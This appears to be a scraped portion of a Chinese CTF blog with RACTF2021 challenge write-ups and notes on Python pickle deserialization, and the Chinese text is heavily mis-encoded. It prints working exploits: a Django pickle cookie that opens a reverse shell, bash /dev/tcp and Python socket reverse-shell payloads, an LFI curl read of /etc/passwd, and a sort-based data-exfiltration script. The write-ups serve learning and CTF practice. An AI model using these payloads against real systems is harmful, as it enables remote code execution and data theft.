django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;) class PickleRce(object): def __reduce__(self): import os return (os.system,(\u0026#34;python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;VPS IP\\\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39;\u0026#34;,)) newContent[\u0026#39;testcookie\u0026#39;] = PickleRce() new_cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;,compress=True) # We can then make a request with this cookie requests.get(\u0026#34;http://193.57.159.27:23934/\u0026#34;, cookies={ \u0026#34;sessionid\u0026#34;: new_cookie }) å¾—åˆ°shellä¹‹åæˆ‘ä»¬åªæ˜¯ä¸ªwebç”¨æˆ·ï¼Œè¯»/etc/shadowå¯ä»¥iå¾—åˆ°adminçš„hashå€¼ï¼Œå¼±å£ä»¤ æ˜¯ä¸ª999999ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥su adminï¼Œè¯»flagäº†\nractf{dj4ng0_lfi_rce_not_unintended}\nå‚è€ƒï¼šwp\nWeb/Military Grade Go is safe, right? That means my implementation of AES will be secure?\nç»™å‡ºäº†goæ–‡ä»¶\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } å¯ä»¥çœ‹åˆ°flagè¢«AES CBCåŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Šï¼›ç§å­ç”Ÿæˆæ˜¯é rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000)å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag for seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\nå‚è€ƒï¼šwp\nWeb/Secret Store How many secrets could a secret store store if a store could store secrets?\næ³¨å†Œå’Œç™»å½•ä¹‹åå¯ä»¥é€šè¿‡apiè®¾ç½®ä¸€ä¸ªè‡ªå·±çš„secretï¼Œè®¾ç½®å¥½ä¹‹åè¿˜å¯ä»¥æ›´æ”¹\nç»™å‡ºäº†æºç ï¼Œæ˜¯djangoæ¡†æ¶ï¼Œç”¨åˆ°äº†rest_frameworkï¼Œé¡µé¢çš„debugæ¨¡å¼è¿˜å¼€ç€ï¼Œæœ‰ä¸€ä¸ªåä¸ºsecretçš„app\nmodels.pyè§„å®šäº†æ•°æ®åº“çš„å­˜å‚¨\nè¿˜æœ‰ä¸ªé…å¥—çš„model serializerï¼Œè§„å®šäº†åªè¯»å’Œåªå†™çš„ä¸åŒå†…å®¹\nç„¶åæ˜¯views.pyï¼Œå½“ç¡®è®¤userç™»å½•çŠ¶æ€ä¹‹åï¼Œå¦‚æœè®¾ç½®è¿‡secretå°†ä¼šå±•ç¤ºå‡ºæ¥\nç›´æ¥ç”¨Getæ–¹å¼è¯·æ±‚/api/secret/?format=jsonå¯ä»¥å¾—åˆ°æ‰€æœ‰è®¾ç½®è¿‡çš„secretï¼Œç†æ‰€å½“ç„¶çš„çŒœæµ‹id=1,owner=1çš„value=flagï¼Œä½†æ˜¯valueå­—æ®µæ˜¯åªå†™è€Œéåªè¯»çš„\nç”±äºç”¨çš„æ˜¯djangoçš„rest frameworkï¼Œå¯ä»¥åˆ©ç”¨å®ƒçš„Ordering FilteråŠŸèƒ½æ¥å¯¹è¿™äº›jsonå†…å®¹æ ¹æ®valueæ¥è¿›è¡Œä¸€ä¸ªæ’åº/api/secret/?ordering=value\u0026amp;format=json\né‡‡ç”¨char-by-charçš„ç›²æ³¨æ–¹å¼ï¼Œä¸æ–­åœ°é‡å¤è®¾ç½®secret-\u0026gt;ä»¥valueæ’åº-\u0026gt;å¦‚æœä½äºid=1,owner=1çš„å‰é¢ï¼Œå¹¶ä¸”ä¸‹ä¸€æ¬¡å°±ä½äºå®ƒçš„åé¢ï¼Œè¯´æ˜è¿™æ˜¯æ­£ç¡®çš„å­—ç¬¦-\u0026gt;ä¿®æ”¹secretï¼Œç»§ç»­çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦\nexp.py\nimport requests import json flag = \u0026#34;ractf\u0026#34; csrf_token = \u0026#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu\u0026#34; session_id = \u0026#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq\u0026#34; headers = { \u0026#34;Cookie\u0026#34;: f\u0026#34;csrftoken={csrf_token}; sessionid={session_id}\u0026#34;, \u0026#34;X-CSRFToken\u0026#34;: csrf_token } our_secret_id = 14 def update_secret(curr_flag): found_real_char = False for i in range(32, 127): payload = curr_flag + chr(i) json_payload = { \u0026#34;value\u0026#34;: payload } r = requests.post(\u0026#34;http://193.57.159.27:21627/api/secret/\u0026#34;, data=json_payload, headers=headers) # print(r.status_code) r = requests.get( \u0026#34;http://193.57.159.27:21627/api/secret/?ordering=value\u0026amp;format=json\u0026#34;, headers=headers) secrets = json.loads(r.text) for secret in secrets: if secret[\u0026#39;id\u0026#39;] == 1: found_real_char = True if secret[\u0026#39;id\u0026#39;] == our_secret_id: if found_real_char: return chr(i - 1) else: break return chr(i - 1) while True: next_char = update_secret(flag) flag += next_char print(\u0026#39;[+] Curr Flag:\u0026#39;, flag) ractf{data_exf1l_via_s0rt1ng_0c66de47}\nå‚è€ƒï¼šwp1 wp2\nWeb/I\u0026rsquo;m a fun Agent,\nDo you remember the firearms store case from last year? The one they were using as a secret communication platform?\nWell, we\u0026rsquo;ve located the servers for them, the issue is they\u0026rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we\u0026rsquo;ll need to gain shell access to their systems the good old way. They\u0026rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they\u0026rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.\nWe\u0026rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?\nåœ¨/upload/contentå¤„å¯ä»¥ä¸Šä¼ videoï¼Œç‰¹åˆ«çš„æ˜¯ä¸Šä¼ å¤„æœ‰ä¸ªexternal\nç”¨curlæ–¹å¼è¯·æ±‚ä¸€ä¸‹/etc/passwdï¼Œcurl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal\nä¹‹åå°è¯•è¯»æºç ï¼ˆæˆ‘æ²¡çˆ†å‡ºæ¥ç›®å½•ï¼‰ï¼Œä¹‹åçš„çœ‹wpäº†ï¼Œæˆ‘å¤ªèœ\nractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}\nå‚è€ƒï¼šwp\nOSINT/Triangles https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW\nMiscellaneous/Discord Come join our Discord!\nractf{so_here_we_are_again}\nMiscellaneous/Missing Tools Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?\nUsername: ractf\nPassword: 8POlNixzDSThy\nNote: it may take a minute or more for your container to start depending on load\næ ¹æ®ç»™å‡ºçš„ä¿¡æ¯sshè¿å…¥ä¸€ä¸ªç»ˆç«¯ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šçš„å‘½ä»¤éƒ½è¢«ç¦æ­¢äº†\nä½¿ç”¨echo /usr/bin/* /bin/*å¯ä»¥æŸ¥çœ‹èƒ½ä½¿ç”¨çš„å‘½ä»¤è¿˜æœ‰å“ªäº›\nâ€”â€”â€”â€”å…ˆè¯´ä¸€ä¸‹ç®€å•çš„éé¢„æœŸè§£ï¼šecho *æ‰¾åˆ°flag.txtï¼Œç„¶åsource flag.txtæˆ–è€…sh \u0026lt; flag.txtéƒ½èƒ½è¯»å‡ºæ¥\nè€Œé¢„æœŸè§£ä½¿ç”¨çš„æ˜¯split+re-sha256çš„æ–¹å¼ã€‚ç›´æ¥ç”¨sha256sumå¾—åˆ°flagç„¶åæƒ³å¼ºè¡Œæš´åŠ›ç ´è§£æ˜¾ç„¶éå¸¸çš„ä¸ç°å®ï¼Œä½†æ˜¯splitè¿™ä¸ªå·¥å…·å¯ä»¥ä»¥å›ºå®šçš„å­—èŠ‚æ•°æ¥åˆ’åˆ†ç»™å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬ä»¥å¾ˆå°çš„æ ‡å°ºæ¥åˆ’åˆ†flagå¹¶è¿›è¡Œsha256ï¼Œé‚£ä¹ˆè¿™æ ·å¾—åˆ°çš„hashå€¼å°±å°†éå¸¸æœ‰å¯èƒ½çˆ†ç ´å‡ºæ¥ï¼Œæœ€åå†æŠŠå®ƒä»¬åˆèµ·æ¥å°±èƒ½å¾—åˆ°æœ€ç»ˆçš„flagäº†ï¼ˆè¿™é‡Œç”¨3bytesåˆ’åˆ†ï¼‰\n$ split -b 3 flag.txt $ echo * flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal $ sha256sum xa* df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa 582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac 569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad 7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae 618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj 56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal åˆ°CrackStationä¸€æŠŠæ¢­\nractf{std0ut_1s_0v3rr4ted_spl1t_sha}\nå®³ï¼Œå‰å‡ å¤©çŠ¶æ€è«åå¾ˆå·®ï¼Œä¹‹å‰æŠ¥çš„å‡ ä¸ªå‘¨æœ«çš„ctfç”šè‡³è¿ç­¾åˆ°éƒ½æ²¡ç­¾ï¼Œå¤ç°ä¹Ÿæ˜¯ä¸€æ‹–å†æ‹–ï¼Œæ‹–åˆ°ç¯å¢ƒéƒ½å…³å®Œäº†ï¼ŒæŒºåæ‚”çš„ï¼Œæ˜¯è‡ªå·±çš„é—®é¢˜ã€‚\nåœ¨åæ€å’Œè°ƒæ•´äº†ï¼Œå—¯ã€‚\n","date":"2021-08-18T17:07:55+08:00","permalink":"https://amiaaaz.github.io/2021/08/18/ractf2021-wp/","section":"posts","tags":["wp"],"title":"RACTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"åºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ– åœ¨pythonä¸­æœ‰å¥½å‡ ä¸ªå†…ç½®æ¨¡å—éƒ½å¯ä»¥å¹²åºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ–è¿™ä¸ªäº‹ï¼Œæ¯”å¦‚json, pickle/cpickle, shelve, marshalï¼Œè€Œæœ¬æ–‡åé¢æ¶‰åŠåˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œè‹¥æ— ç‰¹æ®Šè¯´æ˜ï¼ŒæŒ‡çš„éƒ½æ˜¯pickleã€‚\npickleåçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å­—èŠ‚æµå­˜å‚¨ï¼Œèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œæ¯”å¦‚\nNone ã€ True å’Œ False æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•° strã€byteã€bytearray åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰ å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•° å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±» __dict__ å±æ€§å€¼æˆ– __getstate__() å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰ å½“ç„¶ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥ã€‚\nå¯¹äºä¸€ä¸ªObjectï¼Œå¯ä»¥é€šè¿‡é‡å†™object.__reduce__()å‡½æ•°ï¼Œä½¿å…¶è¢«åºåˆ—åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼›æ­¤å‡½æ•°ä¼šè¿”å›ä¸€ä¸ª(callable, ([para1, para2, ...])[, ...])çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚\npickleçš„å¸¸ç”¨æ–¹æ³•æœ‰dumps(), loads()å’Œdump(), load()ï¼Œä¸å¸¦sçš„éœ€è¦çš„å‚æ•°æ˜¯æ–‡ä»¶å¥æŸ„ï¼Œè€Œå¸¦sçš„æ‰€éœ€è¦çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚\nè¯´åˆ°pickleä¸å¾—ä¸è°ˆçš„æ˜¯opcodeï¼Œå³PVM(python virtual machine)çš„æ“ä½œç ï¼Œå®ƒå¯ä»¥è¢«PVMçš„è§£æå¼•æ“è§£é‡Šå¤„ç†ã€‚ç›®å‰opcodeæœ‰å¤šä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼ˆä½†å‘ä¸‹å…¼å®¹ï¼‰ï¼Œå…¶ä¸­py2å’Œpy3åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šåè®®ç‰ˆæœ¬ã€‚\nimport pickle a={\u0026#39;1\u0026#39;: 1, \u0026#39;2\u0026#39;: 2} for i in range(4): print(f\u0026#39;ver_{i}\u0026#39;,pickle.dumps(a,protocol=i)) # python3è¾“å‡º protocol\u0026lt;=5 ver_0: b\u0026#39;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.\u0026#39; ver_1: b\u0026#39;}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_2: b\u0026#39;\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_3: b\u0026#39;\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_4: b\u0026#39;\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; ver_5: b\u0026#39;\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; # python2è¾“å‡º protocal\u0026lt;=2 ver_0: (dp0 S\u0026#39;1\u0026#39; p1 I1 sS\u0026#39;2\u0026#39; p2 I2 s. ver_1: }q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. ver_2: ï¿½\u0002}q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. 0å·ç‰ˆæœ¬åºåˆ—åŒ–çš„ç»“æœçœ‹èµ·æ¥å¯è¯»æ€§å¾ˆå¼º éƒ½æ˜¯å¯è§†çš„å­—ç¬¦ï¼Œæ“ä½œç ä¹Ÿæ¯”è¾ƒç›´æ¥åœ°æš´éœ²å‡ºæ¥ï¼Œé‡ç‚¹å…³æ³¨å‡ ä¸ªï¼š\nOpcode Mnemonic Description ( MARK Push a mark object onto the stack S STRING string I INT Push integer or bool; decimal string argument l LIST build a list from topmost stack items d DICT build a dict from stack items } EMPTY_DICT Push empty dict t TUPLE Build a tuple from topmost stack items ) EMPTY_TUPLE Push empty tuple c GLOBAL Push self.find_class(module, args); 2 string args R REDUCE Apply callable to argtuple, both on stack b BUILD call __setstate__ or __dict__.update() i INST build \u0026amp; push class instance o OBJ build \u0026amp; push class instance . STOP Every pickle ends with STOP ä½¿ç”¨**pickletools**å¯ä»¥å°†opcodeè½¬åŒ–ä¸ºè‚‰çœ¼å¯è¯»å–çš„å½¢å¼\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 å¯ä»¥åˆ©ç”¨çš„æ–¹å‘\u0026amp;æ€è·¯ pickleçš„åº”ç”¨åœºæ™¯å…¶å®å¾ˆå¹¿æ³›\nè§£æè®¤è¯token, sessionæ—¶ï¼›å‚è§ï¼šæŒé˜…iReaderæŸç«™Pythonæ¼æ´æŒ–æ˜ï¼ˆä¸€ä¸ªredis+pythonååºåˆ—åŒ–çš„æ —å­ å¯èƒ½å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶ å¯èƒ½å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“ å¯èƒ½ä¼šé€šè¿‡å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼›å‚è§ï¼šsqlmapçš„ä»£ç æ‰§è¡Œæ¼æ´ è¿™é‡Œè¯´ä¸€ä¸‹ç¬¬ä¸€ç‚¹ï¼Œflaské…åˆredisåœ¨æœåŠ¡ç«¯å­˜å‚¨sessionï¼ˆä»¥pickleåºåˆ—åŒ–å½¢å¼è¿›è¡Œå­˜å‚¨ï¼‰ï¼Œå¦‚æœé€šè¿‡cookieè¿›è¡Œè¯·æ±‚session_idæ—¶ï¼Œsessionç§çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ã€‚ç†è®ºä¸Šæ²¡é—®é¢˜ï¼Œä½†å¦‚æœå‡ºç°redisçš„æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå·±è®¾è®¡æ¶æ„çš„sessionï¼Œç„¶åå†è®¾ç½®cookieå»è¯·æ±‚sessionæ—¶ï¼Œæˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œè¾¾åˆ°äº†rceçš„ç›®çš„ã€‚\næ„é€ ååºåˆ—åŒ–çš„payloadç¦»ä¸å¼€__reduce__è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆä¸Šæ–‡ç®€å•çš„æåˆ°è¿‡ï¼‰ï¼Œå®ƒæ˜¯æ–°å¼ç±»ï¼ˆå†…ç½®ç±»ï¼‰ç‰¹æœ‰çš„æ–¹æ³•ï¼ˆå…³äºæ›´å¤špythonå…ƒç±»ç›¸å…³çš„çŸ¥è¯†å¯ä»¥å‚è€ƒstackoverflowçš„è¿™ç¯‡å¸–å­ï¼šWhat are metaclasses in Python?ï¼‰\nâ€”â€”â€”â€”åœ¨python2æœ‰ä¸¤ç§å£°æ˜ç±»çš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å®ä¾‹åŒ–çš„å¯¹è±¡æ€§è´¨æ˜¯ä¸åŒçš„\npython3ä¸­æ¶ˆé™¤äº†ä¸¤è€…çš„åŒºåˆ«ï¼Œè¡¨ç°ä¸ºç¬¬äºŒç§\nå›åˆ°å…³äº__reduce__çš„é—®é¢˜ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª __reduce__ æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨__reduce__ ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ã€‚æŒ‡å®šçš„å…³é”®å°±åœ¨äºè¯¥æ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼šä¸€ä¸ªcallableå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯ ([para1, para2, ...])[, ...])ï¼Œè¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼›æœ€ç®€å•çš„ä¾‹å­æ˜¯return (os.system, ('ls',))ã€‚__reduce__ æ–¹æ³•ä¸opcodeä¸­çš„RæŒ‡ä»¤ç å…³ç³»å¯†åˆ‡ï¼Œå¯ä»¥è¯´PVMçš„RæŒ‡ä»¤ç å°±æ˜¯__reduce__çš„è¿”å›å€¼çš„ä¸€ä¸ªåº•å±‚å®ç°ã€‚\næ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­ # shell.pickle cos system (S\u0026#39;/bin/sh\u0026#39; tR. ä¸Šé¢æ‰‹å†™çš„opcodeæˆåŠŸè¿”å›äº†shçš„shellï¼›è€Œé€šè¿‡dumpså’Œloadså®ç°åˆ™æ˜¯è¿™æ ·ï¼›æˆ‘ä»¬æ‰§è¡Œçš„ä»£ç éƒ½åœ¨__reduce__ä¸­\n# py2 import pickle import os class A(object): def __reduce__(self): a = \u0026#39;/bin/sh\u0026#39; return (os.system,(a,)) a = A() test = pickle.dumps(a) print test pickle.loads(test) ä¹Ÿé¡ºåˆ©è¿”å›äº†shellï¼Œå¾ˆå®¹æ˜“å‘ç°è·Ÿä¸Šé¢æ‰‹å†™çš„opcodeå¹¶æ— å·®å¼‚ï¼Œè€Œè¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ„é€ æ—¶çš„__reduce__å‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥rceï¼Œåå¼¹shellä¹‹ç±»çš„ã€‚\nå¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­ import pickle import os class A(object): def __reduce__(self): a = \u0026#34;\u0026#34;\u0026#34;python2 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.31.29\u0026#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34; return (os.system,(a,)) a=A() result = pickle.dumps(a) pickle.loads(result) # æˆ–è€…æœ€ç®€å•çš„æ‰‹å†™opcode ä¸ç”¨ç‰¹æ„æ„é€ class A() cos system (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; tR. å‚è€ƒï¼šLinuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘ | Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨\næ —å­1 - [DasCTF 0721] easyweb ä¹‹å‰å†™è¿‡äº†ï¼Œåœ¨å¯¹sessionçš„å¤„ç†æ—¶ä½¿ç”¨äº†pickleï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„sessionåå¼¹shellï¼›ä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œpayloadæ€ä¹ˆå†™éƒ½è¡Œ\nç”¨Marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡ å¦‚æœåªåœ¨__reduce__ä¸­ç”¨-cå‚æ•°æ‰§è¡Œä»£ç çš„è¯ï¼Œé‡åˆ°ä¸€äº›è‡ªå®šå‡½æ•° åœ¨æ ¼å¼ä¸Šå°±ä¼šæ¯”è¾ƒéº»çƒ¦\nå‰é¢æåˆ°pickleä¸èƒ½åºåˆ—åŒ–ä»£ç å¯¹è±¡ï¼Œæ¥ä¸ªå®ä¾‹\n# py2 import pickle def foo(): import os def fib(n): if n\u0026lt;=1: return n return fib(n-1)+fib(n-2) print \u0026#39;fib(10)=\u0026#39;,fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) pickle.dumps(foo.func_code) ä½†ä¹Ÿä¸æ˜¯ç»è·¯ä¸€æ¡ï¼ŒMarshalå¯ä»¥è®©è¿™æ®µä»£ç åºåˆ—åŒ–\n# py2 import marshal import base64 def foo(): import os def fib(n): if n \u0026lt;= 1: return n return fib(n-1) + fib(n-2) print \u0026#39;fib(10) =\u0026#39;, fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(foo.func_code)) 